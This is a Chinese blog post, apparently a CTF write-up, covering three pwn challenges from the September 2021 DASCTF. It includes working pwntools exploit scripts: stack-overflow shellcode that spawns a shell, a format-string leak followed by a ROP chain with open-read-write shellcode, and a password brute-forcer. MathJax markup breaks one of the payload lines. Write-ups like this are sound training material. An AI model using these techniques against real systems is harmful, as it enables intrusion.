@@ -1,0 +1,491 @@
+
+
+<!DOCTYPE html>
+<html lang="en" color-mode=light>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>2021九月DASCTF - ShouCheng</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+  
+  <meta name="description" content="前言这个比赛其实是没抱着很认真的态度去打的，可能由于一...">
+  <meta name="author" content="ShouCheng">
+  <link rel="icon" href="/images/icons/favicon-16x16.png" type="image/png" sizes="16x16">
+  <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
+  <link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png" sizes="180x180">
+  <meta rel="mask-icon" href="/images/icons/stun-logo.svg" color="#333333">
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/favicon-144x144.png">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1445822_r673sha78lq.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+    
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">
+
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">
+
+      
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      lazyload: {
+        enable: true,
+        only_post: 'false',
+        loading: '[object Object]'
+      },
+      donate: {
+        enable: false,
+        alipay: '',
+        wechat: ''
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        always_show: false
+      },
+      carrier: {
+        enable: true
+      },
+      daovoice: {
+        enable: true
+      },
+      preview: {
+        background: {
+          default: '',
+          api: ''
+        },
+        motto: {
+          default: '总之岁月漫长，然而值得等待！',
+          typing: true,
+          api: 'https://v2.jinrishici.com/one.json',
+          data_contents: '["data","content"]'
+        },
+      },
+      qrcode: {
+        enable: true,
+        type: 'url',
+        image: '',
+      },
+      toc: {
+        enable: true
+      },
+      scrollbar: {
+        type: 'default'
+      },
+      notification: {
+        enable: true,
+        delay: 4500,
+        list: '',
+        page_white_list: '',
+        page_black_list: ''
+      },
+      search: {
+        enable: true,
+        path: '/search.xml'
+      }
+    }
+  </script>
+
+  
+
+  
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="lock-screen">
+  <div class="loading"></div>
+  
+    
+
+
+  <nav class="navbar">
+    <div class="left">
+      
+        <i class="iconfont iconhome j-navbar-back-home"></i>
+      
+      
+        <i class="iconfont iconqrcode j-navbar-qrcode"></i>
+      
+      
+        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
+      
+      
+        <i class="iconfont iconsearch j-navbar-search"></i>
+      
+    </div>
+    <div class="center">2021九月DASCTF</div>
+    <div class="right">
+      <i class="iconfont iconmenu j-navbar-menu"></i>
+    </div>
+    
+      <div id="qrcode-navbar"></div>
+    
+  </nav>
+
+  
+  
+
+<nav class="menu">
+  <div class="menu-container">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content"><li class="menu-item">
+        <a href="/ " class="underline "> 首页</a>
+      </li><li class="menu-item">
+        <a href="/galleries/ " class="underline "> 摄影</a>
+      </li><li class="menu-item">
+        <a href="/archives/ " class="underline "> 归档</a>
+      </li><li class="menu-item">
+        <a href="/tags/ " class="underline "> 标签</a>
+      </li><li class="menu-item">
+        <a href="/categories/ " class="underline "> 分类</a>
+      </li><li class="menu-item">
+        <a href="/about/ " class="underline "> 关于</a>
+      </li></ul>
+    
+      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+    
+  </div>
+</nav>
+  <main id="main">
+  <div class="article-wrap">
+    <div class="row container">
+      <div class="col-xl-3"></div>
+      <div class="col-xl-6"><article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="/images/theme/post-image.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">2021九月DASCTF</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>September 28, 2021</span>
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>7607</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个比赛其实是没抱着很认真的态度去打的，可能由于一贯的印象，下意识觉得安恒月赛，不是我这种小菜鸡能看的，毕竟从去年年尾学到现在，这种比赛我都是来凑人头的。但是这次，可惜了，后面看了下师傅的wp，发现，竟然不难，所以出篇博客复现一下吧，这是到目前为止，唯一全部pwn题都是我能做的了，也许，这就是进步了吧，岁月漫长，值得期待！</p>
+<p>来源：<a target="_blank" rel="noopener" href="http://rencvn.top/2021/09/26/PWN32/">http://rencvn.top/2021/09/26/PWN32/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LynneHuan/p/15335597.html">https://www.cnblogs.com/LynneHuan/p/15335597.html</a></p>
+<h2 id="hehepwn"><a href="#hehepwn" class="headerlink" title="hehepwn"></a>hehepwn</h2><p><img   class="lazyload" data-original="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152753508.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210928152753508</span></p>
+<p>常规checksec，64位保护全没开，第一想法就是执行shellcode</p>
+<p><img   class="lazyload" data-original="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152907622.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210928152907622</span></p>
+<p><img   class="lazyload" data-original="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152921816.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210928152921816</span></p>
+<p><img   class="lazyload" data-original="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152851336-16328141798011.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210928152851336</span></p>
+<p>首先，会有个输入点，并且还会打印我们输入的内容，只要我们输入满0x20个字符，就会连着rbp一起泄露出来，获取到栈上地址，后面还贴心的给了栈溢出。</p>
+<p>那就明确了：栈上写入shellcode，借用得到来的栈上地址算出shellcode写入的地址，将这个地址填充到返回地址去，然后执行shellcode</p>
+<p><img   class="lazyload" data-original="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928153222539.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210928153222539</span></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#p = process(&quot;./bypwn&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29608</span>)<br>p.recvuntil(<span class="hljs-string">&quot;well you input:\n&quot;</span>)<br>p.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>)<br><span class="hljs-comment">#gdb.attach(p,&quot;b *main&quot;)</span><br>stack_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.info(<span class="hljs-string">&quot;stack_addr==&gt;0x%x&quot;</span> %stack_addr)<br>p.recvuntil(<span class="hljs-string">&quot;EASY PWN PWN PWN~\n&quot;</span>)<br>shellcode = asm(shellcraft.sh())<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(shellcode)))<br>payload = shellcode.ljust(<span class="hljs-number">88</span>, <span class="hljs-string">&#x27;a&#x27;</span>) + p64(stack_addr - <span class="hljs-number">80</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="hahapwn"><a href="#hahapwn" class="headerlink" title="hahapwn"></a>hahapwn</h2><p><img   class="lazyload" data-original="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928145300688.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210928145300688</span></p>
+<p>常规checksec，64位，没开PIE，RELRO也没开全</p>
+<p><img   class="lazyload" data-original="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928145345926.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210928145345926</span></p>
+<p><img   class="lazyload" data-original="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928145402864.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210928145402864</span></p>
+<p>程序也十分简单，但是开了沙箱，所以是orw。给了格式化字符串，用来泄露canary的，以及一个明显栈溢出。</p>
+<p>所以思路很明确的，也很简单，就是通过格式化字符串泄露出canary，其实由于长度够，还能再多泄露一个寄存器或者栈上存储的函数地址，从而获取libc地址，然后呢，这边泄露的选择寄存器上的没问题，刚开始我是选择栈上的stdin，然后发现远程这个打印出来是空的</p>
+<p><img   class="lazyload" data-original="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152412946.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210928152412946</span></p>
+<p><img   class="lazyload" data-original="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152432248.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210928152432248</span></p>
+<p>换成寄存器上的libc地址就行了。拥有了libc和canary后就可以着手布置rop了，我的做法是使用mprotect修改权限然后跳转到read函数进行写入shellcode，最后跳转shellcode执行读取flag。师傅的做法就是直接用rop进行open，read，write的调用读取flag</p>
+<p><img   class="lazyload" data-original="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152051899.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210928152051899</span></p>
+<p>这题有点坑，看了师傅的wp也知道了，环境有点问题，官方给的附件里的libc版本是跟远程靶机差了一个小版本的，把libc换成2.23-0ubuntu11.3即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>main = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&#x27;libc.so.6&#x27;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27901</span>)<br><span class="hljs-comment">#gdb.attach(p,&quot;b *main&quot;)</span><br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;Welcome! What is your name?\n&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;%3<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="1.259ex" height="2.009ex" style="vertical-align: -0.671ex; margin-left: -0.089ex;" viewbox="-38.5 -576.1 542 865.1" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
+<title id="MathJax-SVG-1-Title">p%27</title>
+<defs aria-hidden="true">
+<path stroke-width="1" id="E1-MJMATHI-70" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/>
+</defs>
+<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
+ <use xlink:href="#E1-MJMATHI-70" x="0" y="0"/>
+</g>
+</svg>p&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0xf73c0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br>log.info(<span class="hljs-string">&quot;canary==&gt;0x%x&quot;</span> %canary)<br>p.recvuntil(<span class="hljs-string">&quot;What can we help you?\n&quot;</span>)<br>mprotect = libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>] + libc_base <br>pop_rdi = libc_base + <span class="hljs-number">0x0000000000021112</span><br>pop_rsi = libc_base + <span class="hljs-number">0x00000000000202f8</span><br>pop_rdx = libc_base + <span class="hljs-number">0x0000000000001b92</span><br>read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>bss = <span class="hljs-number">0x601000</span><br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span> + p64(canary) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span> + p64(pop_rdi) + p64(bss) <br>payload += p64(pop_rsi) + p64(<span class="hljs-number">0x1000</span>) + p64(pop_rdx) + p64(<span class="hljs-number">7</span>) + p64(mprotect)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi) + p64(bss + <span class="hljs-number">0x80</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x100</span>) + p64(read)<br>payload += p64(bss + <span class="hljs-number">0x80</span>)<br>shellcode = asm(<br>	<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rsi, 0x67616c662f2e</span><br><span class="hljs-string">    push rsi</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    mov rax, 2</span><br><span class="hljs-string">    xor rsi, rsi</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdi, rax</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    mov rdx, 0x50</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rax, 1</span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>) <br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.1</span>)<br>p.send(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="datasystem"><a href="#datasystem" class="headerlink" title="datasystem"></a>datasystem</h2><p><img   class="lazyload" data-original="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928153319183.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210928153319183</span></p>
+<p>checksec，64位保护全开</p>
+<p>这题是三题里面最复杂的一题，因为在进入真正的程序前，有一个登陆程序，比较复杂，需要花时间进行审计</p>
+<p><img   class="lazyload" data-original="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928154615068.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210928154615068</span></p>
+<p>开了沙箱</p>
+<p><img   class="lazyload" data-original="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928162959918.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210928162959918</span></p>
+<p><img   class="lazyload" data-original="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928163032723.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210928163032723</span></p>
+<p>一进入，要先输入账号和密码通过验证，验证通过才能进入真正的有漏洞的程序。账号已经给：admin；密码要自己去找</p>
+<p><img   class="lazyload" data-original="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928165344870.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210928165344870</span></p>
+<p>我先断点断在比较函数那，看看最终比较的值，第一个参数是我们输入的（原本输入的是八个a），第二个就是要比较的密码。然后我把下一次输入的值换成这个密码</p>
+<p><img   class="lazyload" data-original="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928165946197.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210928165946197</span></p>
+<p>发现，第二个参数的第一个字符变成了0，那不是截断了吗？但是并没有通过验证，然后我去c代码敲了下，原来是要两个字符串同时都是’\x00’才会通过比较，一个是不行的~</p>
+<p><img   class="lazyload" data-original="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928170846837.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210928170846837</span></p>
+<p>然后又试了一些随便输入的密码，惊讶的发现，得到的验证密码结果都是一样的，只有复制的密码那次会出现0，看了下wp，大佬推测是位数的问题，只有32位的数字才能让密码为0，我试了下确实是这样的，接下来就是寻找一个可以也让我们输入的密码被加密成首位是’\x00’就可以通过验证</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&quot;error&quot;</span><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x100</span>):<br>    c = c.to_bytes(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;big&#x27;</span>)<br>    p = process(<span class="hljs-string">&#x27;./datasystem&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;please input username: &quot;</span>, <span class="hljs-string">&quot;admin\x00&quot;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;please input password: &quot;</span>, c*<span class="hljs-number">32</span>)<br>    msg = p.recvline()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;Fail&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> msg:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;=&#x27;</span>*<span class="hljs-number">60</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;a valid char:&quot;</span>, c)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;=&#x27;</span>*<span class="hljs-number">60</span>)<br>    p.close()<br></code></pre></td></tr></table></figure>
+
+<p>这是大佬的爆破脚本，最终获得两个可以通过的值：’c’和’\xec’。然后大佬是用IDA调试的，我以前有尝试过，但是无奈一直报错，但是gdb调试也是一样的，没差</p>
+<p><img   class="lazyload" data-original="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928171601841.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210928171601841</span></p>
+<p>进入下一个程序了</p>
+<p><img   class="lazyload" data-original="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928190830374.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210928190830374</span></p>
+<p><img   class="lazyload" data-original="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928190852013.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210928190852013</span></p>
+<p>这边v3返回值因为%s的缘故会把byte_50A0指向的字符全部作为欲写入的字符，而byte_50A0可以查看，全都是a，似乎有0x508个，所以这边在add写入的内容是溢出的。</p>
+<p><img   class="lazyload" data-original="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928193027743.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210928193027743</span></p>
+<p>万事先泄露libc，这边要先申请再释放一个0x410的堆块，防止进入tcache bin中，然后再申请的得是0x8大小的堆块，因为snprinf会打印个数进去，不能超过八个，否则会把上面残留的bk指针破坏，从而可以泄露出libc地址</p>
+<p><img   class="lazyload" data-original="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928193842290.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210928193842290</span></p>
+<p><img   class="lazyload" data-original="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928194236357.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210928194236357</span></p>
+<p>然后再反序释放三个堆块，申请回来，就会让上面的堆块是最先被申请的，然后通过溢出把堆块分配到0x23330000写入shellcode，之前再来一遍把fd指针为free_hook，申请过去改为shellcode地址，然后释放一个堆块就会跳转执行shellcode了</p>
+<p><img   class="lazyload" data-original="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928200129108.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210928200129108</span></p>
+<p>成功！</p>
+<p><img   class="lazyload" data-original="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928203049261.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210928203049261</span></p>
+<p>不容易，有朝一日我这小菜鸡竟然能赛后“ak”，泪目！</p>
